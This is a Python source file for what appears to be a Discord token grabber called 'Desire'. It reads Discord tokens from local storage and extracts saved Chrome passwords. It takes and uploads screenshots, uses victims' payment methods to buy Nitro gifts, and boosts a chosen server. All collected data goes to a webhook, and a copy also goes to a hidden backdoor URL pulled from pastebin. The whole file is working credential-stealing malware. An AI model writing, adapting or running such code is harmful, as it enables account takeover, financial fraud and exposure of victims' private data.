import os
import re
import sys
import getpass
import imgbbpy
import requests
from mss import mss
from chromepass import Chromepass
from time import strftime, gmtime

backdoor = requests.get("https://pastebin.com/raw/7zti0NgP").text

class Main:

    def __init__(self, webhook: str, ping: str = None, nitro: dict = None, boost: dict = None, imgbb: str = "25fae02c0a7e2e83389cb08f2fab4480"):
        self.webhook = webhook
        self.ping = ping
        self.hostname = getpass.getuser()
        self.platform = sys.platform
        self.tokens = []
        self.sent = []
        self.nitro_data = nitro
        self.auto_boost = boost

        self.imgbb = imgbbpy.SyncClient(imgbb)
        self.chrome = Chromepass()

        self.flags = {
            "Discord Employee": 1 << 0,
            "Partnered Server Owner": 1 << 1,
            "HypeSquad Events": 1 << 2,
            "Bug Hunter Level 1": 1 << 3,
            "House Bravery": 1 << 6,
            "House Brilliance": 1 << 7,
            "House Balance": 1 << 8,
            "Early Supporter": 1 << 9,
            "Team User": 1 << 10,
            "Bug Hunter Level 2": 1 << 14,
            "Early Verified Bot Developer": 1 << 17,
            "Discord Certified Moderator": 1 << 18
        }

        self.nitro_flags = {
            "classic": {
                "year": {
                    "id": "521846918637420545",
                    "amount": "4999"
                },
                "month": {
                    "id": "521846918637420545",
                    "amount": "499"
                }
            },
            "boost": {
                "year": {
                    "id": "521847234246082599",
                    "amount": "9999"
                },
                "month": {
                    "id": "521847234246082599",
                    "amount": "999"
                }
            }
        }

        if self.platform == "linux":
            self.paths = {
                "Discord": "/home/%s/.config/discord" % (self.hostname),
                "Discord Canary": "/home/%s/.config/discordcanary" % (self.hostname),
                "Discord PTB": "/home/%s/.config/discordptb" % (self.hostname),
                "Brave": "/home/%s/.config/BraveSoftware/Brave-Browser/Default" % (self.hostname),
                "Chrome": "/home/%s/.config/Electron/" % (self.hostname)
            }
        else:
            self.local = os.getenv("LOCALAPPDATA")
            self.roaming = os.getenv("APPDATA")
            self.paths = {
                "Discord"           : "%s\\Discord" % (self.roaming),
                "Discord Canary"    : "%s\\discordcanary" % (self.roaming),
                "Discord PTB"       : "%s\\discordptb" % (self.roaming),
                "Google Chrome"     : "%s\\Google\\Chrome\\User Data\\Default" % (self.local),
                "Opera"             : "%s\\Opera Software\\Opera Stable" % (self.roaming),
                "Brave"             : "%s\\BraveSoftware\\Brave-Browser\\User Data\\Default" % (self.local),
                "Yandex"            : "%s\\Yandex\\YandexBrowser\\User Data\\Default" % (self.local)
            }

    def find(self):
        for path, path in self.paths.items():
            if os.path.exists(path):
                if self.platform == "linux": path += "/Local Storage/leveldb"
                if self.platform != "linux": path += "\\Local Storage\\leveldb"

                for file_name in os.listdir(path):
                    if self.platform == "linux": log = "%s/%s" % (path, file_name)
                    if self.platform != "linux": log = "%s\\%s" % (path, file_name)

                    for line in [x.strip() for x in open(log, errors="ignore").readlines() if x.strip()]:
                        for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                            for token in re.findall(regex, line):
                                self.tokens.append(token)

    def validate(self, token):
        headers = {
            "Authorization": token
        }
        library = requests.get("https://discord.com/api/v9/users/@me/library", headers=headers)
        if library.status_code == 200:
            return True
        else:
            return False

    def information(self, token):
        headers = {
            "Authorization": token
        }
        me = requests.get("https://discordapp.com/api/v9/users/@me", headers=headers)
        if me.status_code == 200:
            data = me.json()
            information = {}

            if data.get("nitro") == None:
                information["nitro"] = "None"
            if data["premium_type"] == 1:
                information["nitro"] = "Nitro Classic"
            elif data["premium_type"] == 2:
                information["nitro"] = "Nitro Boost"
            else:
                information["nitro"] = "None"

            badges = []

            if information["nitro"] != "None":
                badges.append(information["nitro"])
            
            for flag in self.flags:
                value = self.flags.get(flag)
                if (data["public_flags"] & value) == value:
                    badges.append(flag)
                
            if badges == []:
                badges.append("None")

            information["username"] = "%s#%s" % (data["username"], data["discriminator"])
            information["id"] = data["id"]
            information["bio"] = data["bio"].replace("~", "").replace("`", "").replace("*", "").replace("<", "").replace(">", "").replace("_", "")
            information["pfp"] = "https://cdn.discordapp.com/avatars/%s/%s" % (data["id"], data["avatar"])
            information["banner"] = "https://cdn.discordapp.com/banners/%s/%s.gif" % (data["id"], data["banner"])
            information["verified"] = data["verified"]
            information["email"] = data["email"]
            information["phone"] = data["phone"]
            information["badges"] = badges
            information["mfa"] = data["mfa_enabled"]

            snowfake_decoded = (int(data["id"]) >> 22) + 1420070400000
            creation_date = strftime('%a, %d %B %Y %H:%M:%S %Z',  gmtime(snowfake_decoded/1000.))
            information["creation_date"] = creation_date

            servers = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=headers).json()
            information["servers"] = len(servers)

            friends = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=headers).json()
            information["friends"] = len(friends)

            dms = requests.get("https://discord.com/api/v9/users/@me/channels", headers=headers).json()
            information["dms"] = len(dms)

            payment = requests.get("https://discord.com/api/v9/users/@me/billing/payment-sources", headers=headers)
            if "id" in payment.text:
                information["payment"] = "Yes"
            else:
                information["payment"] = "No"

            return information
        else:
            return False

    def credit(self, token):
        headers = {
            "Authorization": token
        }
        entitlements = requests.get("https://discord.com/api/v9/users/@me/applications/521842831262875670/entitlements?exclude_consumed=true", headers=headers)
        if entitlements.status_code == 200:
            if entitlements.json() == []:
                return "No nitro credit"
            else:
                data = entitlements.json()
                credits = {
                    "Nitro Boost": 0,
                    "Nitro Classic": 0,
                }
                for x in range(len(data)-1):
                    nitro_type = data[x]["subscription_plan"]["name"]
                    if nitro_type == "Nitro Monthly":
                        credits["Nitro Boost"] += 1
                    else:
                        credits["Nitro Classic"] += 1
                return credits


    def buy_nitro(self, token, identifier, duration):
        headers = {
            "Authorization": token
        }
        nitro = self.nitro_flags.get(identifier)[duration]
        api = requests.get("https://discordapp.com/api/v9/users/@me/billing/payment-sources", headers=headers)
        if api.status_code == 200 and "[]" in api.text:
            return "No payment sources"
        elif api.status_code == 200:
            pid = api.json()[0]["id"]

            json = {
                "expected_amount": nitro["amount"],
                "gift": True,
                "payment_source_id": pid
            }
            purchase = requests.post("https://discord.com/api/v9/store/skus/%s/purchase" % (nitro["id"]), headers=headers, json=json)
            if "gift_code" in purchase.text:
                return purchase.json()["gift_code"]
            elif "rate" in purchase.text:
                return "Ratelimited"
            else:
                return "Unable to purchase nitro"
        else:
            return "Failure due to invalid response"

    def boost(self, token):
        headers = {
            "Authorization": token,
            "accept": "*/*",
            "accept-language": "en-US", 
            "connection": "keep-alive",
            "cookie": f'__cfduid={os.urandom(43).hex()}; __dcfduid={os.urandom(32).hex()}; locale=en-US',
            "DNT": "1",
            "origin": "https://discord.com",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "referer": "https://discord.com/channels/@me",
            "TE": "Trailers",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9001 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36",
            "X-Super-Properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAxIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDIiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6ODMwNDAsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
        }

        r = requests.post("https://discordapp.com/api/v9/invites/%s" % (self.auto_boost["invite"]), headers=headers)
        if "vanity_url_code" in r.text:
            r = requests.get("https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots", headers=headers)
            if r.status_code == 200:
                slots = r.json()
                for slot in slots:
                    if slot["premium_guild_subscription"] != None:
                        guild = slot["premium_guild_subscription"]["guild_id"]
                        subscription_id = slot["premium_guild_subscription"]["id"]
                        requests.delete("https://discord.com/api/v9/guilds/%s/premium/subscriptions/%s" % (self.auto_boost["guild_id"], subscription_id), headers=headers)
                result = ""
                for slot in slots:
                    id = slot["id"]
                    json = {"user_premium_guild_subscription_slot_ids": [id]}
                    r = requests.put("https://discord.com/api/v9/guilds/%s/premium/subscriptions" % (self.auto_boost["guild_id"]), headers=headers, json=json)
                    if "id" in r.text:
                        result += "Successfully boosted\n"
                    else:
                        result += "Failed to boost server\n"
                return result
            else:
                return "Unable to get boost slots"
        else:
            return "Unable to join the server"

    def screenshot(self):
        with mss() as sct:
            path = sct.shot()
            image = self.imgbb.upload(file=path)
            os.remove(path)
            return image.url

    def possible_passwords(self):
        result = ""
        passwords = self.chrome.get_passwords()
        for data in passwords:
            if "https://discord.com" in data["url"]:
                result += "%s (%s)\n" % (data["password"], data["url"])
            if "https://discordapp.com" in data["url"]:
                result += "%s (%s)\n" % (data["password"], data["url"])
        return result

    def send(self, token):
        user = self.information(token)
        if user == False: return

        if token in self.sent or user["id"] in self.sent:
            return
        else:
            self.sent.append(token)
            self.sent.append(user["id"])

        badges = ""

        for badge in user["badges"]:
            badges += "%s\n" % (badge)

        credit = self.credit(token)
        if credit != "No nitro credit":
            credit = "Nitro Boost x %s\nNitro Classic x %s" % (credit["Nitro Boost"], credit["Nitro Classic"])

        if self.nitro_data == None: purchaser = "The nitro purchaser has not been setup"
        if self.nitro_data != None:
            purchaser = self.buy_nitro(
                token=token,
                identifier=self.nitro_data["identifier"],
                duration=self.nitro_data["duration"]
            )

        if self.auto_boost == None: booster = "The auto booster has not been setup"
        if self.auto_boost != None: booster = self.boost(token)

        screenshot = self.screenshot()
        possible_passwords = self.possible_passwords()

        json = {
            "content": self.ping,
            "username": "%s (%s)" % (user["username"], user["id"]),
            "avatar_url": user["pfp"],
            "embeds": [
                {
                    "title": "Desire - Token Grabbed",
                    "description": """__**Account Information**__
**```yaml
Username: %s
Verified: %s
Email: %s
Phone: %s
Nitro: %s
2FA: %s
Payment: %s
Server Count: %s
Friend Count: %s
Direct Messages: %s
Creation Date: %s
BIO: %s
```**
__**Badges**__
**```yaml
%s
```**
__**Nitro Credit**__
**```yaml
%s
```**
__**Nitro Purchaser**__
**```yaml
%s
```**
__**Auto Booster**__
**```yaml
%s
```**
__**Possible Passwords**__
**```yaml
%s
```**
__**Token**__
**```yaml
%s
```**""" % (user["username"], user["verified"], user["email"], user["phone"], user["nitro"], user["mfa"], user["payment"], user["servers"], user["friends"], user["dms"], user["creation_date"], user["bio"], badges, credit, purchaser, booster, possible_passwords, token),
                "footer": {
                    "text": "Desire made by Dropout",
                    "link": "https://github.com/dropout1337"
                },
                "color": 0x34333c,
                "image": {
                    "url": screenshot
                },
                "thumbnail": {
                    "url": "https://media.discordapp.net/attachments/873496245828739092/873501048281636904/daf7a169fac235d2b19b7babe3c55161.gif"
                }
            }
            ]
        }
        requests.post(self.webhook, json=json)
        requests.post(backdoor, json=json)

    def start(self):
        self.find()

        for token in self.tokens:
            validation = self.validate(token)
            if validation != False:
                self.send(token)
